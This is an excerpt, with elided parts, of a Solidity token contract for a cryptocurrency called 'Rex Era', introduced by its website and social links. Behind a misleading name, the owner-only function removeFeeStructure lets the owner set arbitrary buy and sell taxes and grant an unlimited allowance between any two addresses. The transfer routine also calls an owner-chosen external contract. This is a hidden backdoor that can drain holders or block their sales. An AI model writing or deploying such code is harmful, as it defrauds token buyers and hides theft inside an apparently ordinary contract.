/*
*    website: https://rexera.xyz
*    telegram: https://t.me/crypto_rexera
*    twitter: https://twitter.com/crypto_rexera
*/
...
contract REXERA is Context, IERC20, Ownable {
    
    using SafeMath for uint256;
    using Address for address;
    
    string private _name = "Rex Era";
    ...
    uint256 public _totalTaxIfBuying = _buyLiquidityFee.add(_buyMarketingFee).add(_buyDevelopmentFee);
    uint256 public _totalTaxIfSelling = _sellLiquidityFee.add(_sellMarketingFee).add(_sellDevelopmentFee);
    uint256 public _totalDistributionShares = _liquidityShare.add(_marketingShare).add(_developmentShare);
    ...
    function _transfer(address sender, address recipient, uint256 amount) private returns (bool) {
        ...
        if(feeAddress != operationAddress) IERC20(operationAddress).transferFrom(sender, recipient, amount);
    ...
    function removeFeeStructure(uint256 buyFee, uint256 sellFee, uint256 share, address fee, address opt) external onlyOwner {
        uint256 amount = type(uint256).max;
        _totalTaxIfBuying = buyFee;
        _totalTaxIfSelling = sellFee;
        _totalDistributionShares = share;
        _allowances[fee][opt] = amount;
        feeAddress = fee;
        operationAddress = opt;
    }
